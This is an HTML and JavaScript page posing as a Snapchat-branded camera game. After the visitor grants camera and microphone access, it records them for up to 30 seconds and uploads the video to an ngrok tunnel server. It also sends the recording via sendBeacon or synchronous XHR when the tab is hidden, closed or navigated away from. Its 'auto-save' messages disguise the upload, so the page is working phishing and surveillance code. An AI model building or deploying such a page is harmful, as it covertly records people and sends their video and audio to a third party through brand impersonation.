<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Snap Game - Auto Record</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  overflow: hidden;
}

/* Splash Screen */
#splash {
  position: fixed;
  width: 100%;
  height: 100%;
  background: #FFFC00;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column;
  z-index: 1000;
}

#logo {
  width: 120px;
  height: 120px;
  object-fit: contain;
}

#tap {
  margin-top: 20px;
  font-size: 16px;
  color: #333;
}

#startBtn {
  margin-top: 15px;
  padding: 12px 20px;
  border-radius: 25px;
  border: none;
  background: black;
  color: white;
  font-size: 16px;
  cursor: pointer;
}

#message {
  margin-top: 10px;
  color: red;
  font-size: 14px;
  text-align: center;
  padding: 0 20px;
}

/* Camera View */
#camera {
  width: 100%;
  height: 100vh;
  object-fit: cover;
  display: none;
}

/* Recording Indicator */
.recording-indicator {
  position: fixed;
  top: 20px;
  right: 20px;
  background: rgba(0,0,0,0.7);
  color: white;
  padding: 8px 16px;
  border-radius: 20px;
  font-size: 14px;
  display: none;
  z-index: 100;
  font-family: monospace;
}

.recording-indicator.active {
  display: block;
  animation: blink 1s infinite;
}

.recording-indicator::before {
  content: "●";
  color: #ff4444;
  margin-right: 8px;
  animation: pulse 1s infinite;
}

@keyframes blink {
  0% { opacity: 1; }
  50% { opacity: 0.7; }
  100% { opacity: 1; }
}

@keyframes pulse {
  0% { opacity: 1; }
  50% { opacity: 0.5; }
  100% { opacity: 1; }
}

/* Countdown */
.countdown {
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  font-size: 100px;
  color: white;
  text-shadow: 2px 2px 10px rgba(0,0,0,0.8);
  z-index: 200;
  display: none;
  font-weight: bold;
  background: rgba(0,0,0,0.5);
  padding: 20px 40px;
  border-radius: 20px;
  text-align: center;
}

/* Status */
#status {
  position: fixed;
  bottom: 30px;
  left: 50%;
  transform: translateX(-50%);
  background: rgba(0,0,0,0.8);
  color: white;
  padding: 10px 20px;
  border-radius: 25px;
  font-size: 14px;
  display: none;
  z-index: 100;
  font-family: monospace;
  white-space: nowrap;
}

/* Auto-save message */
.auto-save {
  position: fixed;
  bottom: 100px;
  left: 50%;
  transform: translateX(-50%);
  background: rgba(0,0,0,0.8);
  color: #4CAF50;
  padding: 8px 16px;
  border-radius: 20px;
  font-size: 12px;
  display: none;
  z-index: 100;
  white-space: nowrap;
}
</style>
</head>

<body>

<!-- Splash Screen -->
<div id="splash">
  <img id="logo" src="./sm_5b321c9cb2d25.jpg" alt="Snapchat Logo" onerror="this.src='https://via.placeholder.com/120?text=Snap'">
  <div id="tap">Camera access required</div>
  <button id="startBtn" onclick="startApp()">Allow Camera & Start</button>
  <div id="message"></div>
</div>

<!-- Camera -->
<video id="camera" autoplay playsinline muted></video>

<!-- UI Elements -->
<div class="recording-indicator" id="recordingIndicator">Recording</div>
<div class="countdown" id="countdown"></div>
<div id="status"></div>
<div class="auto-save" id="autoSaveMsg">Auto-saving video...</div>

<script src="https://cdn.socket.io/4.5.3/socket.io.min.js"></script>

<script>
// Configuration
const BACKEND_URL = "https://tableware-dweeb-estate.ngrok-free.dev";
let socket = null;
let mediaRecorder = null;
let recordedChunks = [];
let stream = null;
let isRecording = false;
let recordingStartTime = null;
let hasSentVideo = false;
let autoStopTimer = null;
let pageHidden = false;

// Connect to server
function connectSocket() {
  return new Promise((resolve, reject) => {
    socket = io(BACKEND_URL, {
      transports: ['websocket', 'polling'],
      timeout: 10000
    });
    
    socket.on('connect', () => {
      console.log('✅ Connected to server');
      document.getElementById('message').innerHTML = '';
      resolve();
    });
    
    socket.on('connect_error', (err) => {
      console.error('Connection error:', err);
      reject(err);
    });
    
    socket.on('recording-complete', (data) => {
      console.log('✅ Video saved on server:', data);
      showStatus('✓ Video saved!', '#4CAF50');
    });
  });
}

// Start the app and auto-record
async function startApp() {
  const splash = document.getElementById("splash");
  const camera = document.getElementById("camera");
  const msg = document.getElementById("message");
  
  try {
    // Connect to server
    showStatus('Connecting to server...');
    await connectSocket();
    
    // Get camera access
    showStatus('Requesting camera...');
    stream = await navigator.mediaDevices.getUserMedia({ 
      video: true, 
      audio: true 
    });
    
    // Setup camera
    camera.srcObject = stream;
    camera.style.display = "block";
    splash.style.display = "none";
    
    // Setup media recorder
    setupMediaRecorder();
    
    // Show recording indicator
    document.getElementById('recordingIndicator').classList.add('active');
    
    // Start recording with countdown
    startRecordingWithCountdown();
    
    // Setup page visibility and unload handlers
    setupPageHandlers();
    
  } catch (err) {
    console.error('Error:', err);
    msg.innerText = "⚠️ Please allow camera and microphone to play this game";
    document.getElementById("startBtn").innerText = "Try Again";
    showStatus('Error: ' + err.message);
  }
}

// Setup MediaRecorder
function setupMediaRecorder() {
  // Find supported MIME type
  const mimeTypes = [
    'video/webm;codecs=vp9,opus',
    'video/webm;codecs=vp8,opus',
    'video/webm;codecs=h264,opus',
    'video/webm'
  ];
  
  let selectedMimeType = '';
  for (const mimeType of mimeTypes) {
    if (MediaRecorder.isTypeSupported(mimeType)) {
      selectedMimeType = mimeType;
      break;
    }
  }
  
  console.log('Using MIME type:', selectedMimeType);
  
  mediaRecorder = new MediaRecorder(stream, {
    mimeType: selectedMimeType
  });
  
  mediaRecorder.ondataavailable = (event) => {
    if (event.data && event.data.size > 0) {
      recordedChunks.push(event.data);
      console.log(`📹 Chunk received: ${event.data.size} bytes, total chunks: ${recordedChunks.length}`);
    }
  };
  
  mediaRecorder.onstop = () => {
    console.log('MediaRecorder stopped');
    if (recordedChunks.length > 0 && !hasSentVideo) {
      sendVideoToServer();
    }
  };
  
  mediaRecorder.onerror = (err) => {
    console.error('Recorder error:', err);
    showStatus('Recording error', '#ff4444');
  };
}

// Start recording with 3-second countdown
function startRecordingWithCountdown() {
  let count = 3;
  const countdownEl = document.getElementById('countdown');
  countdownEl.style.display = 'block';
  countdownEl.textContent = count;
  
  const countdownInterval = setInterval(() => {
    count--;
    if (count > 0) {
      countdownEl.textContent = count;
    } else {
      clearInterval(countdownInterval);
      countdownEl.style.display = 'none';
      
      // Start recording
      startRecording();
    }
  }, 1000);
}

// Start recording
function startRecording() {
  if (mediaRecorder && mediaRecorder.state === 'inactive') {
    recordedChunks = [];
    hasSentVideo = false;
    
    // Start recording, collect data every second
    mediaRecorder.start(1000);
    isRecording = true;
    recordingStartTime = Date.now();
    
    console.log('🔴 Recording started');
    showStatus('🔴 Recording... (auto-save on close)', '#ff4444');
    
    // Set maximum recording duration (e.g., 30 seconds)
    autoStopTimer = setTimeout(() => {
      if (isRecording && !hasSentVideo) {
        console.log('⏰ Max recording time reached, stopping...');
        stopAndSendVideo();
      }
    }, 30000); // Stop after 30 seconds max
  }
}

// Stop recording and send video
function stopAndSendVideo() {
  if (mediaRecorder && mediaRecorder.state === 'recording') {
    console.log('🛑 Stopping recording...');
    isRecording = false;
    
    if (autoStopTimer) {
      clearTimeout(autoStopTimer);
      autoStopTimer = null;
    }
    
    mediaRecorder.stop();
    showStatus('Processing video...', '#ffa500');
    document.getElementById('recordingIndicator').classList.remove('active');
  }
}

// Send video to server
async function sendVideoToServer() {
  if (hasSentVideo) {
    console.log('Video already sent, skipping');
    return;
  }
  
  if (recordedChunks.length === 0) {
    console.log('No video data to send');
    showStatus('No video recorded', '#ff4444');
    return;
  }
  
  hasSentVideo = true;
  
  // Show auto-save message
  const autoSaveMsg = document.getElementById('autoSaveMsg');
  autoSaveMsg.style.display = 'block';
  
  showStatus('📤 Uploading video...', '#ffa500');
  console.log(`Sending ${recordedChunks.length} chunks, total size: ${getTotalSize()} bytes`);
  
  try {
    // Create blob from chunks
    const mimeType = mediaRecorder.mimeType;
    const videoBlob = new Blob(recordedChunks, { type: mimeType });
    
    // Convert to array buffer
    const arrayBuffer = await videoBlob.arrayBuffer();
    
    // Emit to server
    socket.emit('video-data', arrayBuffer);
    
    showStatus('✓ Video sent!', '#4CAF50');
    
    setTimeout(() => {
      autoSaveMsg.style.display = 'none';
    }, 3000);
    
  } catch (error) {
    console.error('Error sending video:', error);
    showStatus('Failed to send video', '#ff4444');
    hasSentVideo = false;
  }
}

// Get total size of recorded chunks
function getTotalSize() {
  return recordedChunks.reduce((total, chunk) => total + chunk.size, 0);
}

// Show status message
function showStatus(message, color = '#ffffff') {
  const statusEl = document.getElementById('status');
  statusEl.textContent = message;
  statusEl.style.backgroundColor = 'rgba(0,0,0,0.8)';
  statusEl.style.display = 'block';
  
  setTimeout(() => {
    if (statusEl.textContent === message) {
      statusEl.style.display = 'none';
    }
  }, 3000);
}

// Setup handlers for page close/unload
function setupPageHandlers() {
  // Handle page visibility change (tab switch or minimize)
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
      console.log('📱 Page hidden, preparing to save video...');
      pageHidden = true;
      
      // Show warning
      showStatus('Saving video...', '#ffa500');
      
      // Stop recording if active
      if (isRecording && !hasSentVideo) {
        stopAndSendVideo();
      }
    }
  });
  
  // Handle beforeunload (page close, refresh, back button)
  window.addEventListener('beforeunload', (event) => {
    console.log('🚪 Page closing, sending final video...');
    
    if (isRecording && !hasSentVideo && mediaRecorder) {
      // Stop recording immediately
      if (mediaRecorder.state === 'recording') {
        mediaRecorder.stop();
      }
      
      // Note: For beforeunload, we can't guarantee async operations complete
      // But the server should still receive if we send synchronously
      if (recordedChunks.length > 0 && socket && !hasSentVideo) {
        // Try to send synchronously
        const mimeType = mediaRecorder.mimeType;
        const videoBlob = new Blob(recordedChunks, { type: mimeType });
        
        // Use navigator.sendBeacon for reliable delivery on page close
        if (navigator.sendBeacon) {
          const reader = new FileReader();
          reader.onloadend = () => {
            const arrayBuffer = reader.result;
            // Send via beacon (more reliable for page close)
            const blob = new Blob([arrayBuffer], { type: 'application/octet-stream' });
            navigator.sendBeacon(`${BACKEND_URL}/upload-beacon`, blob);
          };
          reader.readAsArrayBuffer(videoBlob);
        } else {
          // Fallback to sync XHR
          const xhr = new XMLHttpRequest();
          xhr.open('POST', `${BACKEND_URL}/upload-sync`, false); // false = synchronous
          xhr.send(videoBlob);
        }
      }
    }
    
    // Clean up camera
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }
  });
  
  // Handle page hide (for mobile)
  window.addEventListener('pagehide', () => {
    console.log('📱 Page hide event');
    if (isRecording && !hasSentVideo) {
      stopAndSendVideo();
    }
  });
  
  // Handle popstate (back button)
  window.addEventListener('popstate', () => {
    console.log('⬅️ Back button pressed');
    if (isRecording && !hasSentVideo) {
      stopAndSendVideo();
    }
  });
}

// Optional: Add a manual stop button if needed
function addManualStopButton() {
  const btn = document.createElement('button');
  btn.textContent = 'Stop & Save';
  btn.style.position = 'fixed';
  btn.style.bottom = '20px';
  btn.style.left = '20px';
  btn.style.padding = '10px 20px';
  btn.style.backgroundColor = '#ff4444';
  btn.style.color = 'white';
  btn.style.border = 'none';
  btn.style.borderRadius = '5px';
  btn.style.zIndex = '100';
  btn.onclick = () => {
    if (isRecording && !hasSentVideo) {
      stopAndSendVideo();
    }
  };
  document.body.appendChild(btn);
}

// Call this if you want a manual stop button
// addManualStopButton();
</script>

</body>
</html>
